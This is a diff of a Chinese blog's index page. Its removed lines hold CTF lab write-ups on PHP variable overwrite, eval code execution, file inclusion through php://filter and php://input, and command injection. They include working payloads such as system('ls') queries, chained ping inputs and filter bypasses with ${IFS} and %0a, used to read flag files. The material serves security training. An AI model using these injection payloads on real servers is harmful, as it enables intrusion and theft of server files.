@@ -381,17 +381,19 @@
       
         
           
-            <p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40657585/article/details/83545051">https://blog.csdn.net/qq_40657585/article/details/83545051</a></p>
-<h1 id="extract-漏洞"><a href="#extract-漏洞" class="headerlink" title="extract 漏洞"></a>extract 漏洞</h1><p><img src="https://img-blog.csdnimg.cn/20201127231919826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">extract()函数<br><img src="https://img-blog.csdnimg.cn/2020112723235148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201127233628583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>extract()漏洞</p>
-<p><img src="https://img-blog.csdnimg.cn/20201127232445879.png" alt="在这里插入图片描述">extract()函数引入变量，当冲突的时候，会引入新的变量，意思也就是覆盖原来的变量。</p>
-<p>数组中有同名元素的时候，会覆盖。</p>
-<p>extract()  获得一个get值是liwu。content从flag里获得一个去空的flag字符串。如果相等，输出flag。</p>
-<p>构造?liwu=&amp;flag=</p>
-<p><img src="https://img-blog.csdnimg.cn/20201127232853534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">flag{s0metimes^its-useful}</p>
-<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="$$漏洞"></a>$$漏洞</h1><p><img src="https://img-blog.csdnimg.cn/20201127233915736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020112723404853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">由于第8，12-15行间的代码会将$ flag的值给覆盖掉，所以只能利用第一个foreach先将$ flag的值赋给$ _200，然后利用die($ _200)将原本的flag值打印出来。<br><img src="https://img-blog.csdnimg.cn/20201127234546336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">flag{Variable_coverage_is_interesting}</p>
-
-          
+          参考：https://blog.csdn.net/qq_40657585/article/details/83545051
+extract 漏洞extract()函数
+extract()漏洞
+extract()函数引入变量，当冲突的时候，会引入新的变量，意思也就是覆盖原来的变量。
+数组中有同名元素的
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/11/28/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
 	  <div>
@@ -535,21 +537,15 @@
       
         
           
-            <h2 id="BASIC-RCE"><a href="#BASIC-RCE" class="headerlink" title="BASIC RCE"></a>BASIC RCE</h2><p>RCE英文全称：remote command/code execute（远程命令/代码执行漏洞）<br>分为远程命令执行ping和远程代码执行evel。<br>漏洞出现的原因：没有在输入口做输入处理。<br>我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。相当于直接操控服务器电脑的cmd命令行！高危漏洞！</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43486981/article/details/107997468">https://blog.csdn.net/weixin_43486981/article/details/107997468</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13797436.html">https://www.cnblogs.com/NPFS/p/13797436.html</a></p>
-<h2 id="basic-rce"><a href="#basic-rce" class="headerlink" title="basic rce"></a>basic rce</h2><p><img src="https://img-blog.csdnimg.cn/20201128030212911.png" alt="在这里插入图片描述"><br>PHP代码显示，要求将命令赋值给a然后执行,<br>先查看一下根目录文件 /?a=system(“ls”);<br>！<strong>切记最后的分号不可省略！</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/20201128030344343.png" alt="在这里插入图片描述"><br>发现f111a9.php，试着打开php文件, /?a=system(“cat f111a9.php”); 发现打不开。</p>
-<p>应该是文件中包含特殊字符，使用管道运行base64加密内容</p>
-<p>/?a=system(“cat f111a9.php|base64”);</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128030707901.png" alt="在这里插入图片描述">进行解码,得到flag：flag{Web_xiao_fen_dui}<br><img src="https://img-blog.csdnimg.cn/20201128030752296.png" alt="在这里插入图片描述"></p>
-<h2 id="basic-rce2"><a href="#basic-rce2" class="headerlink" title="basic rce2"></a>basic rce2</h2><p><img src="https://img-blog.csdnimg.cn/20201128031321970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先查看一下根目录文件/?Rem=system(“ls”); 发现<br><img src="https://img-blog.csdnimg.cn/20201128031500371.png" alt="在这里插入图片描述"><br>但题目中</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128032721390.png" alt="在这里插入图片描述"></p>
-<p>过滤了more、less等，直接用include进行包含</p>
-<p>?Rem=include $_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128032731840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进行解码,得到flag</p>
-<p>flag{oh_Rem_is_so_cute~}</p>
-
-          
+          BASIC RCERCE英文全称：remote command/code execute（远程命令/代码执行漏洞）分为远程命令执行ping和远程代码执行evel。漏洞出现的原因：没有在输入口做输入处理。我们常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/11/28/BASIC%20RCE/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
 	  <div>
@@ -693,62 +689,19 @@
       
         
           
-            <p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43486981/article/details/107997468">https://blog.csdn.net/weixin_43486981/article/details/107997468</a></p>
-<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p><img src="https://img-blog.csdnimg.cn/20201128033300737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h2><p><img src="https://img-blog.csdnimg.cn/20201128033507951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>PHP代码显示，要求将命令赋值给cmd然后执行,<br>先查看一下根目录文件 /?cmd=system(“ls”);<br>！切记最后的分号不可省略！</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128033630215.png" alt="在这里插入图片描述"></p>
-<p>没有有用的文件。查看上一级的文件夹/?cmd=system(“ls /“);</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128033703585.png" alt="在这里插入图片描述">打开flag文件发现FLAG， /?cmd=system(“cat /flag_987”);</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128033835552.png" alt="在这里插入图片描述">ctfhub{aa7f6908d8b32a47e43adbaf}</p>
-<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><img src="https://img-blog.csdnimg.cn/20201128100919852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开shell，</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128100950723.png" alt="在这里插入图片描述"><br><strong>request = post + get</strong></p>
-<p>查看当前目录下的文件ls</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128101155604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">没有看见flag文件，查看上一级目录</p>
-<p><img src="https://img-blog.csdnimg.cn/2020112810140624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开flag文件</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128101518658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>ctfhub{fddc1f2639fb2eff6a7f9200}</p>
-<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p><img src="https://img-blog.csdnimg.cn/2020112810230413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201128102226906.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201128102140342.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/2020112810211615.png" alt="在这里插入图片描述">查看phpinfo，发现以下字段，证明是可以使用php://input的。</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128101931899.png" alt="在这里插入图片描述">查看目录，未发现flag相关文件<br><img src="https://img-blog.csdnimg.cn/20201128102521115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查看上一级文件目录，发现flag文件</p>
-<p><img src="https://img-blog.csdnimg.cn/2020112810270838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">打开，发现ctfhub{f86bf35874ab96bd5d11bff3}<br><img src="https://img-blog.csdnimg.cn/20201128102803736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h2><p><img src="https://img-blog.csdnimg.cn/20201128103340987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201128103349494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用filter将源码通过base64回显。</p>
-<p>?file=php://filter/read=convert.base64-encode/resource=../../../flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128103526810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">base64解码   ctfhub{1e36eab66eaa91a85cd8e3d3}</p>
-<h2 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h2><p><img src="https://img-blog.csdnimg.cn/20201128103739330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201128103851357.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201128103810245.png" alt="在这里插入图片描述"><br>查看PHPinfo文件，发现可以使用php://input</p>
-<p>查看目录<br><img src="https://img-blog.csdnimg.cn/20201128104120751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">没有发现，查看上一级</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128104230195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现，打开，发现   ctfhub{6ef9bbcb28e28b861f8104d0}<br><img src="https://img-blog.csdnimg.cn/20201128104305954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p><img src="https://img-blog.csdnimg.cn/20201128105045661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201128104835244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">使用&amp;连接符，输入ip &amp; ls 命令查看目录</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128105230385.png" alt="在这里插入图片描述">打开13759185423006.php，使用base64显示php文件，输入ip &amp; cat 13759185423006.php | base64 </p>
-<p><img src="https://img-blog.csdnimg.cn/20201128105454936.png" alt="在这里插入图片描述">base64解码   &lt;?php // ctfhub{e15590654339a56f0d06d690}</p>
-<h2 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h2><p><img src="https://img-blog.csdnimg.cn/20201128105939545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="![![在这里插入图片描述](https://img-blog.csdnimg.cn/2020112810573748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70](https://img-blog.csdnimg.cn/20201128105838700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201128105809432.png" alt="在这里插入图片描述">过滤了cat</p>
-<p>查看目录</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128110016738.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/202011281057166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">使用more输出base64密文<br>ip &amp; more flag_98282881918773.php | base64</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128110106936.png" alt="在这里插入图片描述">base64解码   &lt;?php //：ctfhub{44f27e15168a48d3e740aec7}</p>
-<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p><img src="https://img-blog.csdnimg.cn/20201128110314321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201128110340100.png" alt="在这里插入图片描述">过滤了空格，用 <code>/**/</code>代替空格，查看目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x2F;**&#x2F;&amp;&#x2F;**&#x2F;ls</span><br></pre></td></tr></table></figure>
+          参考：https://blog.csdn.net/weixin_43486981/article/details/107997468
+RCE
+eval执行PHP代码显示，要求将命令赋值给cmd然后执行,先查看一下根目录文件 /?cmd=system(“ls”);！切记最后的分号不可省略！
 
-<p><img src="https://img-blog.csdnimg.cn/20201128110449158.png" alt="在这里插入图片描述">输入<br><code>127.0.0.1|cat&lt;flag_26980134823536.php|base64</code><br>读取flag的base64密文</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128111211373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">解码   &lt;?php // ctfhub{f9b096d8723a177842846b95}</p>
-<h2 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h2><p><img src="https://img-blog.csdnimg.cn/20201128112009686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201128112036234.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201128112123321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现flag子文件夹，但<code>/</code>被过滤了，<code>127.0.0.1;cd flag_is_here;ls</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20201128112325882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><code>127.0.0.1;cd flag_is_here;cat flag_319802531432421.php|base64</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20201128112445949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">解码得   &lt;?php // ctfhub{dbf55fcce8dda5896ab36211}</p>
-<h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p><img src="https://img-blog.csdnimg.cn/20201128132745408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="![在这里插入图片描述](https://img-blog.csdnimg.cn/20201128132730996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201128112634467.png" alt="在这里插入图片描述">查看目录，发现flag文件<br><img src="https://img-blog.csdnimg.cn/20201128132722463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">过滤了管道符|，不能再使用了<br><code>base64 1.php</code> 与 <code>****|base64</code> 是等价的<br>使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 ; base64 flag_323721940723792.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20201128132947334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">解码得到   &lt;?php // ctfhub{a0fdc1075a58d1cddc66bc20}</p>
-<h2 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h2><p><img src="https://img-blog.csdnimg.cn/20201128133217474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">过滤了<code>| &amp; ; cat flag ctfhub 空格</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20201128133303444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>因为%0a是url编码，所以一定要输在url中，否则%0a会被再次编码</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1%0Als# </span><br></pre></td></tr></table></figure>
-<p>查看目录</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128133659816.png" alt="在这里插入图片描述"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1%0acd$&#123;IFS&#125;f***_is_here$&#123;IFS&#125;%0als</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20201128133652132.png" alt="在这里插入图片描述"><code>?ip=127.0.0.1%0acd$&#123;IFS&#125;f***_is_here$&#123;IFS&#125;%0abase64$&#123;IFS&#125;f***_19044653130103.php</code><br><img src="https://img-blog.csdnimg.cn/20201128133826212.png" alt="在这里插入图片描述">解码得到   &lt;?php // ctfhub{3ebda1295a19356aafb1065e}</p>
-
-          
+没有有用
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/11/28/RCE/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
 	  <div>
@@ -1406,6 +1359,9 @@
   
 
   
+  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.4"></script>
+  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.4"></script>
+
 
   
 
